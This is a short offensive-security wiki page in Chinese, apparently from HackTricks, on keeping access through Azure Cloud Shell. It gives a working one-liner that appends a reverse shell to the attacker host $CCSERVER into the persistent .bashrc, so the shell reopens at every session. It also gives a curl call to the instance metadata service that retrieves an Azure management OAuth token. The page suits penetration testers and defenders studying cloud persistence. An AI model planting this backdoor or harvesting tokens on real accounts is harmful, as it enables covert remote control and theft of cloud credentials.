# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell 提供命令行访问以管理 Azure 资源，具有持久存储和自动身份验证。攻击者可以通过在持久主目录中放置后门来利用这一点：

* **持久存储**：Azure Cloud Shell 的主目录挂载在 Azure 文件共享上，即使会话结束后也保持完整。
* **启动脚本**：像 .bashrc 这样的文件在每个会话开始时自动执行，允许在云 shell 启动时进行持久执行。

Example backdoor in .bashrc:
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
这个后门可以在用户完成云 shell 后的 5 分钟内执行命令。

此外，查询 Azure 的元数据服务以获取实例详细信息和令牌：
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{{#include ../../../banners/hacktricks-training.md}}
